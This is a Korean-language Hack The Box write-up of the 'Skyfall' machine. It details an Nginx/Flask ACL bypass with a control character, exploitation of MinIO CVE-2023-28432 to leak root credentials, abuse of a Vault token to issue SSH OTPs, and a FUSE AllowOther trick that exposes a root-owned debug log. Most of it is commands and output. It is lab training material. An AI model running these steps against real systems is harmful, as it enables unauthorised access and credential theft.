---
title: "Skyfall (Insane)"
date: 2025-12-14
layout: single
excerpt: "Skyfall은 Insane 난이도의 머신으로 MinIO를 백엔드로 사용하는 Flask 기반 베타 클라우드 스토리지 웹 애플리케이션이 구성되어 있다. Nginx ACL과 Flask 설정 오류로 인해 제한 구역 접근이 가능하며, 해당 구역에 노출된 MinIO Prometheus 메트릭을 통해 내부 호스트명과 취약한 MinIO 버전을 확인할 수 있다. 노출된 MinIO 버전에는 CVE-2023-28432 정보 노출 취약점이 존재하며, 이를 통해 MinIO 루트 자격 증명이 유출된다. 해당 자격 증명으로 S3 버킷에 접근하면 사용자 홈 디렉터리 백업과 버전 기록이 저장되어 있고, 그중 한 버전에 Hashicorp Vault 토큰이 포함되어 있다. 이 토큰으로 Vault 정책을 열거하면 SSH OTP 인증이 설정되어 있음을 확인할 수 있으며, Vault에서 OTP를 요청해 일반 사용자로 SSH 접속이 가능하다. 이후 해당 사용자는 Vault 언실 바이너리를 sudo로 실행할 수 있고, 특정 플래그 사용 시 루트 소유의 debug.log 파일이 생성된다. sshfs 기반 FUSE 마운트를 이용해 권한 제한을 우회하여 해당 파일을 유출하면 로그에서 Vault 루트 토큰을 획득할 수 있으며, 이 토큰으로 루트 OTP를 생성해 최종적으로 루트 권한으로 SSH 로그인이 가능하다."
author_profile: true
toc: true
toc_label: "Previous"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/skyfall/skyfall.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, nginx, acl-bypass, flask, minio, cve-2023-28432, information-disclosure, s3, backup-leak, credentials-leak, vault, ssh, otp, sudo, fuse, debug-log-abuse, priv-esc]
---

![Skyfall](/assets/htb-linux/skyfall/skyfall.png)

**Skyfall**은 Insane 난이도의 머신으로 MinIO를 백엔드로 사용하는 `Flask` 기반 베타 클라우드 스토리지 웹 애플리케이션이 구성되어 있다.  
**Nginx ACL과 Flask 설정 오류로 인해 인증 우회**가 가능하며, 해당 구역에 노출된 MinIO Prometheus 메트릭을 통해 내부 호스트명과 취약한 MinIO 버전을 확인할 수 있다.

**노출된 MinIO 버전에는 `CVE-2023-28432` 정보 노출 취약점이 존재하며**, 이를 통해 MinIO 루트 자격 증명이 유출된다.  
해당 자격 증명으로 S3 버킷에 접근하면 사용자 홈 디렉터리 백업과 버전 기록이 저장되어 있고, 그중 한 버전에 **Hashicorp Vault 토큰이 포함**되어 있다.

이 토큰을 활용해 Vault를 열거하면 `SSH OTP` 인증이 설정되어 있음을 확인할 수 있으며, Vault에서 OTP를 요청해 일반 사용자로 SSH 접속이 가능하다.  
이후, 해당 사용자는 Vault 언실 바이너리를 `sudo`로 실행할 수 있고, 특정 플래그 사용 시 루트 소유의 `debug.log` 파일이 생성된다.

**`sshfs` 기반 FUSE 마운트를 이용해 파일을 유출하면**, 로그에서 Vault 루트 토큰을 획득할 수 있으며, **해당 토큰으로 루트 OTP를 생성해** 최종적으로 루트 권한으로 SSH 로그인이 가능하다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.230.158`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.230.158 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 23:39 EST
Nmap scan report for skyfall.htb (10.129.230.158)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
```

Nmap 스캔 결과 `SSH(22)`, `HTTP(80)` 서비스가 열려 있으며, HTTP 서비스는 `nginx 1.18.0` 기반으로 동작하고 있다.

웹 페이지 접근 시 **skyfall.htb** 도메인으로 접근해야 함을 확인했다.

---

# Vulnerability Analysis

웹 페이지에 접속하면 클라우드 스토리지 및 데이터 관리 서비스를 제공하는 회사의 공식 홈페이지 형태임을 확인할 수 있다.

<details>
  <summary>웹 페이지 메인 화면</summary>

  <img src="/assets/htb-linux/skyfall/web.png" alt="Skyfall Web" />
</details>


웹 페이지 하단에는 데모 페이지로 이동하는 버튼이 존재하며, 이를 클릭하면 `demo.skyfall.htb` 로 연결된다.

![하위 도메인 존재](/assets/htb-linux/skyfall/demo-web.png)

데모 페이지에 접속하면 대시보드 화면이 표시되며, 좌측 메뉴를 통해 `Sky Storage` 의 여러 기능에 접근할 수 있다.

![대시보드 화면](/assets/htb-linux/skyfall/dashboard.png)

대시보드 하단의 문구를 통해 웹 애플리케이션이 `Flask` 기반으로 동작하고 있음을 확인할 수 있다.

또한 메뉴에 `MinIO Metrics` 항목과 관련 태스크가 존재하는 점으로 미루어 보아, 백엔드 스토리지로 [MinIO](https://www.min.io/)를 사용하고 있음을 추측할 수 있다.

## Nginx ACL Bypass

좌측 메뉴에 `MinIO Metrics` 항목이 존재하며, 해당 메뉴로 이동할 경우 `403 Forbidden` 이 반환되어 접근이 제한되어 있음을 확인할 수 있다.

![403 Forbidden](/assets/htb-linux/skyfall/metrics.png)

이를 우회할 수 있는 기법을 이해하기 위해 [Exploiting HTTP Parsers Inconsistencies](https://blog.bugport.net/exploiting-http-parsers-inconsistencies) 글을 참고하였다.

예를 들면, 내부적으로 Nginx는 아래와 같이 `/metrics` 경로에 대해 접근을 제한하고 있으며, 대부분의 사용자 요청은 `403 Forbidden` 으로 차단된다:

```nginx
location = /metrics {
    deny all;
}

location = /metrics/ {
    deny all;
}
```

**Nginx는 요청을 처리하기 전에 경로 정규화를 수행**하는데, 이 과정에서 불필요한 슬래시, 점(`.`), 경로 탐색 요소, URL 인코딩 문자 등을 정리하여 요청 경로를 비교한다.

`/metrics\x85` 와 같은 요청의 경우, Nginx에서는 해당 경로가 `/metrics` 와 정확히 일치하지 않는다고 판단하여, 기본 proxy 규칙에 따라 `Flask` 로 전달된다.

반면 Flask는 요청을 처리하는 과정에서 `\x85`와 같은 제어 문자가 포함된 경로를 정규화하여 해석한다. 이로 인해 `/metrics\x85` 요청이 `/metrics`로 인식되어 라우팅되며, 결과적으로 접근이 허용되어 `200 OK` 응답이 반환된다.

이처럼 Nginx 버전에 따라 ACL을 우회할 수 있는 제어 문자들이 존재하며, 특정 버전에서는 `\x1F`, `\x1E`... 와 같은 문자를 활용한 우회가 가능하다:

![활용](/assets/htb-linux/skyfall/acl.png)

이를 활용하여 요청 경로의 hex 값에 우회 가능한 제어 문자 `\x0c`를 삽입한 후 요청을 전송할 경우, `200 OK` 응답이 반환되며, 웹 페이지 접근이 정상적으로 이루어짐을 확인할 수 있다:

![우회 성공](/assets/htb-linux/skyfall/acl-bypass.png)

해당 경로에 접근한 후, 하단에서 다음과 같은 내부 HTTP 주소를 확인할 수 있다:

```http
http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster
```

해당 도메인을 `/etc/hosts` 에 추가한 뒤 접근하면, 여러 MinIO 클러스터 노드의 Prometheus 메트릭 정보가 노출된다:

```text
# HELP minio_audit_failed_messages Total number of messages that failed to send since start
# TYPE minio_audit_failed_messages counter
minio_audit_failed_messages{server="minio-node1:9000",target_id="sys_console_0"} 0
minio_audit_failed_messages{server="minio-node2:9000",target_id="sys_console_0"} 0
# HELP minio_audit_target_queue_length Number of unsent messages in queue for target
# TYPE minio_audit_target_queue_length gauge
minio_audit_target_queue_length{server="minio-node1:9000",target_id="sys_console_0"} 0
minio_audit_target_queue_length{server="minio-node2:9000",target_id="sys_console_0"} 0
# HELP minio_audit_total_messages Total number of messages sent since start
# TYPE minio_audit_total_messages counter

... [SKIP]

# HELP minio_software_version_info MinIO Release tag for the server
# TYPE minio_software_version_info gauge
minio_software_version_info{server="minio-node1:9000",version="2023-03-13T19:46:17Z"} 0
minio_software_version_info{server="minio-node2:9000",version="2023-03-13T19:46:17Z"} 0
# HELP minio_usage_last_activity_nano_seconds Time elapsed (in nano seconds) since last scan activity. This is set to 0 until first scan cycle
# TYPE minio_usage_last_activity_nano_seconds gauge
minio_usage_last_activity_nano_seconds{server="minio-node2:9000"} 1.2383469373e+10
```

이 메트릭 정보를 통해 현재 사용 중인 MinIO 버전이 `2023-03-13` 임을 확인할 수 있다.

## MinIO information disclosure vulnerability (CVE-2023-28432)

해당 버전엔 MinIO 정보 유출 취약점 (`CVE-2023-28432`) 이 존재한다.

> **[CVE-2023-28432](https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services) 관련 글을 참고하였다.**

취약한 MinIO 버전에서는 다음과 같은 **내부 bootstrap API 경로**가 접근 제어 없이 노출된다:

```text
/minio/bootstrap/v1/verify
```

해당 경로는 MinIO 클러스터 초기화 및 검증을 위해 사용되는 내부용 bootstrap API로, `POST` 방식의 요청이 전달될 경우 **인증 및 권한 검증 없이 MinIO가 사용하는 환경 변수가 응답에 포함**되어 반환된다.

이처럼 `/minio/bootstrap/v1/verify` 경로로 `POST` 방식의 요청을 전송하면, 응답에는 `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD`를 포함한 MinIO 관리자 자격 증명이 노출됨을 확인할 수 있다:

![자격 증명 노출](/assets/htb-linux/skyfall/cve.png)

## MinIO Backup File Enumeration

이후 [MinIO Client GitHub](https://github.com/minio/mc)을 참고하여, `mc` 바이너리를 다운로드 및 실행한 후, 획득한 자격 증명을 이용하여 MinIO 서버에 클라이언트를 연결하였다:

```bash
$ ./mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

Added `skyfall` successfully.
```

해당 명령어를 통해 `skyfall` 이라는 alias로 MinIO 서버 연결이 성공하였다:

```bash
$ ./mc alias list                                                                                         
         
# [SKIP]

skyfall
  URL       : http://prd23-s3-backend.skyfall.htb                                                                                            
  AccessKey : 5GrE1B2YGGyZzNHZaIww                                                                                                           
  SecretKey : GkpjkmiVmpFuL2d3oRx0                                                                                                           
  API       : s3v4                                                                                                                           
  Path      : auto                                                                                                                           
  Src       : /home/kali/.mc/config.json
```

이후 [mc](https://docs.min.io/enterprise/aistor-object-store/reference/cli/) 명령어를 활용하여 MinIO 스토리지의 파일 구조를 탐색하였다:

```bash
$ ./mc ls skyfall      

[2023-11-07 23:59:15 EST]     0B askyy/
[2023-11-07 23:58:56 EST]     0B btanner/
[2023-11-07 23:58:33 EST]     0B emoneypenny/
[2023-11-07 23:58:22 EST]     0B gmallory/
[2023-11-07 19:08:01 EST]     0B guest/
[2023-11-07 23:59:05 EST]     0B jbond/
[2023-11-07 23:58:10 EST]     0B omansfield/
[2023-11-07 23:58:45 EST]     0B rsilva/
```

여러 사용자 디렉터리 중 `askyy` 디렉터리를 확인한 결과, 다음과 같은 파일들을 발견할 수 있었다:

```bash
$ ./mc ls skyfall/askyy

[2023-11-08 00:35:28 EST]  48KiB STANDARD Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD home_backup.tar.gz
```

또한 MinIO의 버전 히스토리가 유지되고 있어, 각 파일의 이전 버전들을 확인할 수 있었다:

```bash
$ ./mc ls skyfall/askyy --versions  

[2023-11-08 00:35:28 EST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT Welcome.pdf
[2023-11-09 16:37:25 EST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
[2023-11-09 16:37:09 EST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
[2023-11-09 16:36:30 EST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
```

확인된 각 버전의 `home_backup.tar.gz` 파일을 로컬 시스템으로 다운로드하였다:

```bash
$ ./mc get --version-id 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz ./v1

$ ./mc get --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz ./v2

$ ./mc get --version-id 25835695-5e73-4c13-82f7-30fd2da2cf61 skyfall/askyy/home_backup.tar.gz ./v3
```

## Backup Analysis and Vault Token Discovery

`v1` 버전의 백업 파일을 압축 해제한 결과, `terraform-generator` 라는 이름의 웹 디렉터리와 함께 SSH 키 디렉터리 및 여러 `.bash` 관련 파일들이 포함되어 있음을 확인할 수 있었다:

```bash
$ ls -al

drwxr-x--- 5 kali kali    4096 Nov  9  2023 .
drwxr-x--- 6 kali kali    4096 Dec 15 05:49 ..
-rw-rw-r-- 1 kali kali   10296 Nov  8  2023 .bash_history
-rw-r--r-- 1 kali kali     220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 kali kali    3771 Jan  6  2022 .bashrc
drwx------ 2 kali kali    4096 Oct  9  2023 .cache
-rw-rw-r-- 1 kali kali 2181120 Dec 15 05:50 home_backup.tar
-rw-r--r-- 1 kali kali     807 Jan  6  2022 .profile
drwx------ 2 kali kali    4096 Nov  9  2023 .ssh
-rw-r--r-- 1 kali kali       0 Oct  9  2023 .sudo_as_admin_successful
drwxrwxr-x 7 kali kali    4096 Nov  9  2023 terraform-generator
-rw-rw-r-- 1 kali kali       1 Nov  9  2023 .viminfo
```

확인된 SSH 개인 키를 이용해 접속을 시도했으나, 키 기반 인증은 실패하였다:

```bash
$ chmod 600 ./.ssh/id_rsa
```

```bash
$ ssh -i ./.ssh/id_rsa askyy@10.129.230.158 

(askyy@10.129.230.158) Password:
```

이후 `v2` 버전의 백업 파일을 분석하는 과정에서, `.bashrc` 파일 내에 [HashiCorp Vault](https://developer.hashicorp.com/vault)와 관련된 환경 변수가 설정되어 있음을 확인하였다:

```bash
$ cat .bashrc

# [SKIP]

export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"

# [SKIP]
```

해당 Vault 주소를 `/etc/hosts` 에 추가한 뒤, Vault CLI에서 사용하기 위해 관련 환경 변수를 설정하였다:

```bash
$ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
                                                                                                                                             
$ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"                                                         
                                                                                                                                             
$ export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"  
```

---

# Exploitation

## Abusing Vault SSH OTP Authentication

획득한 Vault 토큰을 이용해 토큰 정보를 열거한 결과, 해당 토큰이 `developers` 정책을 포함하고 있음을 확인할 수 있었다:

```bash
$ vault token lookup

Key                  Value
---                  -----
accessor             rByv1coOBC9ITZpzqbDtTUm8
creation_time        1699563963
creation_ttl         768h
display_name         token-askyy
entity_id            n/a
expire_time          2073-10-27T21:06:03.043964076Z
explicit_max_ttl     0s
id                   hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
issue_time           2023-11-09T21:06:03.445155372Z
last_renewal         2023-11-20T16:43:24.043964166Z
last_renewal_time    1700498604
meta                 <nil>
num_uses             0
orphan               true
path                 auth/token/create
policies             [default developers]
renewable            true
ttl                  419601h21m9s
type                 service
```

이후 [vault policy list](https://developer.hashicorp.com/vault/docs/commands/policy) 명령어를 사용하여 정책 목록을 열거하려 시도했으나, 권한 부족으로 인해 접근이 거부되었다:

```bash
$ vault policy list

Error listing policies: Error making API request.
                                                                                                                                             
URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/policies/acl?list=true                                                               
Code: 403. Errors:                                                                                                                           
                                                                                                                                             
* 1 error occurred:                                                                                                                          
        * permission denied 
```

앞서 `vault policy list` 명령으로는 정책 열거가 불가능했기 때문에, [Stack Overflow](https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v) 관련 글을 참고하여, 현재 토큰에 적용된 ACL 정보를 확인하였다:

```bash
$ vault read sys/internal/ui/resultant-acl --format=json | jq -r .data 

{
  "exact_paths": {
    "auth/token/lookup-self": {
      "capabilities": [
        "read"
      ]
    },
    "auth/token/renew-self": {
      "capabilities": [
        "update"
      ]
    },
    "auth/token/revoke-self": {
      "capabilities": [
        "update"
      ]
    },
    "ssh/creds/dev_otp_key_role": {
      "capabilities": [
        "create",
        "read",
        "update"
      ]
    },
# [SKIP]
```

이를 통해 SSH OTP 발급에 사용되는 `dev_otp_key_role` 경로에 대해, 해당 토큰이 `create`, `read`, `update` 권한을 가지고 있음을 확인할 수 있다.

이러한 권한을 활용하여 [Vault SSH Secrets Engine](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords)을 통해 1회용 SSH OTP 발급을 시도하였다:

```bash
$ vault write ssh/creds/dev_otp_key_role username=askyy ip=10.129.230.158

Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/gar6VEbf7JeWNUeBQ4oQKccV
lease_duration     768h
lease_renewable    false
ip                 10.129.230.158
key                c6ed9d75-ae24-3641-6aaa-a84f6a3ca283
key_type           otp
port               22
username           askyy
```

Vault에서의 write 요청은 내부적으로 `create` 및 `update` 권한을 요구하므로, 해당 경로에 대한 권한이 존재할 경우 OTP 발급이 가능하다.

발급된 1회용 OTP를 이용해 SSH 접속을 시도한 결과, `askyy` 사용자로 정상적인 SSH 접근에 성공하였다:

![askyy SSH](/assets/htb-linux/skyfall/user-ssh.png) 

---

# Privilege Escalation

## Enumerating sudo Privileges

`sudo -l` 명령어를 통해 `askyy` 사용자가 수행할 수 있는 권한을 확인한 결과, 다음과 같이 출력되었다:

```bash
askyy@skyfall:~$ sudo -l

Matching Defaults entries for askyy on skyfall:                                                                     
    env_reset, mail_badpass,                                                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty               
                                                                                                                    
User askyy may run the following commands on skyfall:                                                               
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$                              
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml 
```

위 권한은 루트 권한으로 [vault-unseal](https://developer.hashicorp.com/vault/docs/concepts/seal#seal-unseal) 바이너리를 실행할 수 있도록 설정되어 있다.

unseal 과정은 **복호화에 필요한 루트 키를 확보하여 Vault가 암호화된 데이터를 해독**할 수 있게 만드는 과정이다.

따라서 `vault-unseal` 은 이러한 unseal 작업을 자동화하는 도구로 보이며, `/etc/vault-unseal.yaml` 에는 unseal 과정에 필요한 설정(키/토큰)이 포함될 수 있다.

## Abusing vault-unseal Debug Logging via FUSE

도움말에서 확인할 수 있듯이 `-d` 옵션은 디버그 로그를 파일로 기록한다. 해당 바이너리를 `sudo` 로 실행할 경우 디버그 로그 파일은 루트 권한으로 생성되므로, 로그에 민감 정보가 포함되는 경우 이를 통해 Vault 루트 토큰이 노출될 가능성이 존재한다:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h

Usage:                                                                                                              
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```

`-v` 옵션을 사용하여 실행할 경우, 설정 파일 내에 마스킹 처리된 루트 토큰이 존재함을 확인할 수 있으며, 출력 메시지에서도 디버그 모드를 활성화할 경우 상세 정보가 기록될 수 있음을 나타내고 있다:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v

[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

그러나 `-d` 옵션을 사용해 디버그 로그 파일을 생성한 이후, 해당 파일을 직접 읽으려고 하면 접근 권한이 없어 열람이 불가능하다:

```bash
askyy@skyfall:~$ cat debug.log

cat: debug.log: Permission denied
```

이를 우회하기 위해, 디렉터리를 마운트하여 로그 파일을 외부로 노출시킬 수 있는 [go-fuse](https://github.com/hanwen/go-fuse) 기반 FUSE 파일 시스템을 활용하였다.

먼저 해당 도구를 로컬 환경으로 다운로드한 뒤, `/examples/memfs` 디렉터리로 이동하여 빌드를 수행하였다:

```bash
$ ls

main.go
```

```bash
$ go build
```

```bash
$ ls 

main.go  memfs
```

빌드 결과 생성된 `memfs` 바이너리를 `askyy` 사용자의 시스템으로 전송한 후, 마운트 지점으로 사용할 디렉터리를 생성하였다:

```bash
askyy@skyfall:~$ mkdir mountdir
```

이후, 실행 권한을 부여하고, `mountdir` 에 마운트를 지정해 줬다:

```bash
askyy@skyfall:~$ chmod +x memfs
```

```bash
askyy@skyfall:~$ ./memfs ./mountdir/ file

Mounted!
```

마운트가 완료된 상태에서, `mountdir` 디렉터리 내부에서 `vault-unseal` 바이너리 `-d` 옵션을 지정해 실행하였다:

```bash
askyy@skyfall:~/mountdir$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d

2025/12/15 13:50:04 open debug.log: permission denied
```

하지만 `permission denied` 오류가 발생하였다. 원인을 분석한 결과, FUSE 파일 시스템은 기본적으로 **마운트한 사용자만 접근 가능하도록 제한**되어 있으며, `sudo` 로 실행된 루트 프로세스는 해당 마운트 지점에 접근할 수 없기 때문이다.

[go-fuse 공식 문서](https://pkg.go.dev/github.com/hanwen/go-fuse/v2/fuse#MountOptions)에 따르면, `fuse.MountOptions` 구조체에는 FUSE 마운트 옵션을 제어하기 위한 `AllowOther` 필드가 존재한다.

해당 옵션은 FUSE의 `allow_other` 마운트 옵션을 Go 코드에서 설정하기 위한 것이다.

[FUSE 공식 문서](https://man7.org/linux/man-pages/man8/mount.fuse3.8.html)에 따르면, `allow_other` 옵션은 파일 시스템 소유자에 대한 접근 제한을 해제하여 **모든 사용자(루트 포함)가 파일에 접근할 수 있도록 허용**한다.

따라서 `main.go` 에서 FUSE 마운트 옵션을 설정하는 부분에 `AllowOther` 필드를 활성화하여, 루트 파일이 해당 마운트 지점에 접근할 수 있도록 구성하였다:

```go
server, err := fuse.NewServer(conn.RawFS(), mountPoint, &fuse.MountOptions{
        Debug: *debug,
        AllowOther: true, // +
}
```

동일한 방식으로 바이너리를 다시 빌드한 후, `mountdir` 를 마운트 지점으로 지정하여 FUSE 파일 시스템을 구성하였다. 

이 상태에서 `sudo` 권한으로 `vault-unseal` 을 실행한 결과, 이전과 달리 `permission denied` 오류 없이 정상적으로 동작함을 확인할 수 있었다:

```bash
askyy@skyfall:~/mountdir$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d

[>] Checking seal status
[+] Vault sealed: false
```

이후 `file1` 파일이 생성된 것을 확인할 수 있으며, 해당 파일을 확인한 결과, 디버그 로그 내부에 Vault 루트 토큰이 평문으로 기록되어 있음을 확인할 수 있었다:

```bash
askyy@skyfall:~$ cat file1

2025/12/15 14:41:13 Initializing logger...
2025/12/15 14:41:13 Reading: /etc/vault-unseal.yaml
2025/12/15 14:41:13 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2025/12/15 14:41:13 Found Vault node: http://prd23-vault-internal.skyfall.htb
2025/12/15 14:41:13 Check interval: 5s
2025/12/15 14:41:13 Max checks: 5
2025/12/15 14:41:13 Establishing connection to Vault...
2025/12/15 14:41:13 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2025/12/15 14:41:13 Checking seal status
2025/12/15 14:41:13 Vault sealed: false
```

획득한 Vault 루트 토큰을 로컬 환경에 설정한 후 토큰 정보를 확인한 결과, 해당 토큰에 `root` 정책이 적용되어 있음을 확인할 수 있었다:

```bash
$ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
```

```bash
$ vault token lookup

Key                 Value
---                 -----
accessor            bXBeXR3r92WGQ8XgEDx6pIFu
creation_time       1699398419
creation_ttl        0s
display_name        root
entity_id           n/a
expire_time         <nil>
explicit_max_ttl    0s
id                  hvs.I0ewVsmaKU1SwVZAKR3T0mmG
meta                <nil>
num_uses            0
orphan              true
path                auth/token/root
policies            [root]
ttl                 0s
type                service
```

이후 SSH Secrets Engine의 역할을 열거한 결과, 관리자용 OTP 발급에 사용되는 `admin_otp_key_role` 이 존재함을 확인하였다:

```bash
$ vault list ssh/roles

Keys
----
admin_otp_key_role
dev_otp_key_role
```

루트 권한을 가진 토큰을 활용하여, `admin_otp_key_role`에 대해 1회용 SSH OTP 발급을 시도하였다:

```bash
$ vault write ssh/creds/admin_otp_key_role ip=10.129.230.158 username=root

Key                Value
---                -----
lease_id           ssh/creds/admin_otp_key_role/wJsdtsfov37MENAKOotARFm4
lease_duration     768h
lease_renewable    false
ip                 10.129.230.158
key                2258c6e7-bdee-5e16-d93a-3d574743b93d
key_type           otp
port               22
username           root
```

그 결과, 루트 권한으로 SSH 접속에 성공하였다:

![루트](/assets/htb-linux/skyfall/root-ssh.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![플래그](/assets/htb-linux/skyfall/flag.png)
